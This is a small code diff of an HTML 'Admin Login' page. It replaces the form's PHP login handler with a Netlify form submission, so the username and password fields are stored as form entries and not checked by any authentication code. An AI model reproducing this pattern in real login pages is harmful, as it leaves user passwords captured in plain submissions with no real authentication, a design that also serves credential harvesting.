@@ -60,7 +60,8 @@
 <body>
   <div class="login-box">
     <h1>Admin Login</h1>
-    <form action="../login.php" method="POST">
+    <form name="login" method="POST" data-netlify="true">
+      <input type="hidden" name="form-name" value="login">
       <input type="text" name="username" placeholder="Username" required><br>
       <input type="password" name="password" placeholder="Password" required><br>
       <input type="submit" value="Login">
